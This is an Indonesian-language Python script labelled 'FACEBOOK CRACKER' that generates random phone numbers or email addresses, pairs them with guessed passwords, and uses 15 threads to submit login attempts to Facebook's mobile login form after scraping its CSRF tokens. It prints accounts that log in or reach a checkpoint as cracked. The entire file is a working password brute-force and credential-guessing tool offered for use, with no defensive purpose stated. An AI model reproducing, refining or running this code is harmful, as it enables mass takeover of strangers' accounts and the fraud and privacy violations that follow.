#Coded by DulLah (fb.me/dulahz)

import os, re, time, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      session=requests.Session()
      csrf=session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8')
      action=re.findall('method="post" action="(.*?)"', csrf.text)[0]
      lsd=re.findall('name="lsd" value="(.*?)"', csrf.text)[0]
      jazoest=re.findall('name="jazoest" value="(.*?)"', csrf.text)[0]
      m_ts=re.findall('name="m_ts" value="(.*?)"', csrf.text)[0]
      li=re.findall('name="li" value="(.*?)"', csrf.text)[0]
      data={
        'lsd':lsd,
        'jazoest':jazoest,
        'm_ts':m_ts,
        'li':li,
        'email':str(user),
        'pass':str(pw),
      }
      session.headers.update({
        'user-agent':'Mozilla/5.0',
        'referer':'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
      })
      session.post('https://mbasic.facebook.com{0}'.format(action), data=data)
      cek=session.cookies.keys()
      session.cookies.clear()
      if 'checkpoint' in cek:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break;
      elif 'c_user' in cek:
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break;
  except: brute(user, passs)

def random_numbers():
  data = []
  os.system('clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_email():
  data = []
  os.system('clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]

  Isi nama penggunanya ya kaka
  Contoh: putri
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Masukan jumlah email yang akan dibuat contoh: 10
  Jumlah: '''))
  setpw=input('''
  Set password yg mendekati nama pengguna
  contoh: putri123,putri1234
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def pilih():
  print('''
  1. Crack dari nomor random
  2. crack dari email random
  ''')
  pil=int(input('  Pilih mana man?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error kaka , silahkan coba lagi yahh.')